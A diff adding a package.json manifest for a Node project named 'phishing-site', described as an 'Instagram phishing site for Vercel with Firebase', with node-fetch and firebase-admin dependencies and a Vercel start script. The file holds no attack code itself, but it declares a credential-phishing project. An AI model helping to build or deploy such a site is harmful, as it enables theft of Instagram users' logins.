@@ -1,0 +1,12 @@
+{
+    "name": "phishing-site",
+    "version": "1.0.0",
+    "description": "Instagram phishing site for Vercel with Firebase",
+    "dependencies": {
+        "node-fetch": "^2.6.7",
+        "firebase-admin": "^11.5.0"
+    },
+    "scripts": {
+        "start": "vercel dev"
+    }
+}
